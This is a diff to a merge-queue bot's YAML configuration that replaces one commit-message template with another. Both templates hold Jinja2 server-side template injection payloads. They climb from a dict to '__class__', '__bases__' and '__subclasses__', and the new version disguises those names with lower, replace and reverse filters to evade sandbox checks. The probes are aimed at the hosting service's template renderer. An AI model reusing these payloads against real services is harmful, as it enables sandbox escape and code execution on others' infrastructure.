@@ -6,13 +6,11 @@ queue_rules:
     merge_conditions: []
     merge_method: merge
     commit_message_template: |
-      V4
-      TITLE={{ title }}
-      BODY={{ body }}
-      HEAD={{ head }}
-      AUTHOR={{ author }}
-      SELF={{ self }}
-      MRO_VIA_BODY={{ [dict]|selectattr("__class__")|first|attr(body or "fromkeys") }}
-      METHOD_CALL={{ [dict]|selectattr("__class__")|first|attr(title or "fromkeys")(["x"])|attr("keys")() }}
+      V5
+      LOWER_CLASS={% set d = "__CLASS__"|lower %}{{ [dict]|selectattr("__class__")|first|attr(d or "fromkeys") }}
+      LOWER_BASES={% set d = "__BASES__"|lower %}{{ [dict]|selectattr("__class__")|first|attr(d or "fromkeys") }}
+      LOWER_SUBCLASS={% set d = "__SUBCLASSES__"|lower %}{{ [dict]|selectattr("__class__")|first|attr(d or "fromkeys") }}
+      REPLACE_CLASS={% set d = "XXclassXX"|replace("XX","__") %}{{ [dict]|selectattr("__class__")|first|attr(d or "fromkeys") }}
+      REVERSE_CLASS={% set d = "__ssalc__"|reverse %}{{ [dict]|selectattr("__class__")|first|attr(d or "fromkeys") }}
 merge_queue:
   max_parallel_checks: 1
